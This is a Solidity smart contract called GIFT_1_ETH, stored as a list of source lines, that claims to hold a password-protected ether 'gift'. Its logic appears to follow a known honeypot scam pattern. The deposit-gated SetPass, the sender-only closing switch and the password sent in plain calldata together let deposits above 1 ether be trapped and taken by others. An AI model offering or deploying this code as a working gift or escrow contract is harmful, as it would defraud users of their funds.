['pragma solidity ^0.4.19;\n', '\n', 'contract GIFT_1_ETH\n', '{\n', '    function GetGift(bytes pass)\n', '    external\n', '    payable\n', '    {\n', '        if(hashPass == keccak256(pass) && now>giftTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function GetGift()\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==reciver && now>giftTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    bytes32 hashPass;\n', '    \n', '    bool closed = false;\n', '    \n', '    address sender;\n', '    \n', '    address reciver;\n', ' \n', '    uint giftTime;\n', ' \n', '    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPass(bytes32 hash)\n', '    public\n', '    payable\n', '    {\n', '        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '            giftTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetGiftTime(uint date)\n', '    public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            giftTime = date;\n', '        }\n', '    }\n', '    \n', '    function SetReciver(address _reciver)\n', '    public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            reciver = _reciver;\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash)\n', '    public\n', '    {\n', '        if(hash==hashPass&&msg.sender==sender)\n', '        {\n', '           closed=true;\n', '        }\n', '    }\n', '    \n', '    function() public payable{}\n', '    \n', '}']